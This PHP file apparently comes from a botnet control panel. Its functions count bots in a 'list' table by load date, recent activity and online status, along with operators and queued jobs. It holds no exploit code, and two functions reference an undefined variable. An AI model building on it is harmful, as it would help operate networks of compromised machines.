<?php
date_default_timezone_set('Europe/Moscow');
function stat_load_today($db)
{
	$query = mysql_query('SELECT COUNT(*) FROM `list` WHERE (`date` BETWEEN "'.date('Y-m-d').' 00:00:00" AND "'.date('Y-m-d').' 23:59:59")');
        $load_today = mysql_fetch_row($query);
	$total_today = $load_today[0];
	return $total_today;	
		
}


function stat_load_yesterday($db)
{
	$query = mysql_query('SELECT COUNT(*) FROM `list` WHERE (`date` BETWEEN "'.date('Y-m-').date("d", (time()-86400)).' 00:00:00" AND "'.date('Y-m-').date("d", (time()-86400)).' 23:59:59")');
        $load_yesterday = mysql_fetch_row($query);
	$total_yesterday = $load_yesterday[0];
	return $total_yesterday;	
		
}

function stat_load_week($db)
{
	$query = mysql_query('SELECT COUNT(*) FROM `list` WHERE (`date` BETWEEN "'.date("Y-m-d", strtotime("last Monday")).' 00:00:00" AND "'.date("Y-m-d", strtotime("Sunday")).' 23:59:59")');
        $load_week = mysql_fetch_row($query);
	$total_week = $load_week[0];
	return $total_week;	
		
}

function stat_load_mes($db)
{
	$query = mysql_query('SELECT COUNT(*) FROM `list` WHERE (`date` BETWEEN "'.date('Y-m-').'00 00:00:00" AND "'.date('Y-m-d').' 23:59:59")');
    $load_mes = mysql_fetch_row($query);
	$total_mes = $load_mes[0];
	return $total_mes;	
		
}

function stat_load_all($db)
{
	$query = mysql_query('SELECT COUNT(*) FROM `list`');
        $load_all = mysql_fetch_row($query);
	$total_all = $load_all[0];
	return $total_all;	
		
}


function select_all_operators($db)
{
	$query = mysql_query("SELECT * FROM operators", $db) or die(mysql_error());
	$queryoper = mysql_num_rows($query);

	return $queryoper;
	
}

function select_all_bots($db)
{
//print 'test';
//print_r($db);
	$query = mysql_query("SELECT * FROM list", $db) or die(mysql_error());
	$queryrow = mysql_num_rows($query);

	return $queryrow;
	
}

function select_ready_bots($db)
{
	$date = date("Y-m-d");
	$date_unix = (strtotime($date) - 86400);
	$query = mysql_query('SELECT * FROM `list` WHERE (`last_active` BETWEEN "'.date('Y-m-d').' 00:00:00" AND "'.date('Y-m-d').' 23:59:59")', $db) or die(mysql_error());
	$i = 0;
	while ($queryrow = mysql_fetch_array($query))
	{
		$last_active = (strtotime($queryrow['last_active']));
		if ($last_active > $date_unix)
		{
			$i++;
		}
		
	}


	return $i;
	
}

function ready_bots_hours($db)
{
    $date = date("Y-m-d H:i:s");
	$query = mysql_query("SELECT * FROM `list` WHERE `last_active` >= subdate('$date',INTERVAL 180 MINUTE)") or die(mysql_error());
	$i = 0;
	while ($queryrow = mysql_fetch_array($query))
	{
		$last_active = (strtotime($queryrow['last_active']));
		if ($last_active > $date_unix)
		{
			$i++;
		}
		
	}


	return $i;
	
}


function stat_online_bots($db)
{
    $date = date("Y-m-d H:i:s");
	$query = mysql_query("SELECT * FROM `list` WHERE `last_active` >= subdate('$date',INTERVAL 2 MINUTE)") or die(mysql_error());
	$i = 0;
	while ($queryrow = mysql_fetch_array($query))
	{
		$last_active = (strtotime($queryrow['last_active']));
		if ($last_active > $date_unix)
		{
			$i++;
		}
		
	}


	return $i;
	
}





function select_jobs_bots($db)
{
	$query = mysql_query('SELECT COUNT(*) FROM `job_info`');
        $load_bots = mysql_fetch_row($query);
	$jobs_bots = $load_bots[0];
	return $jobs_bots;	
		
}
?>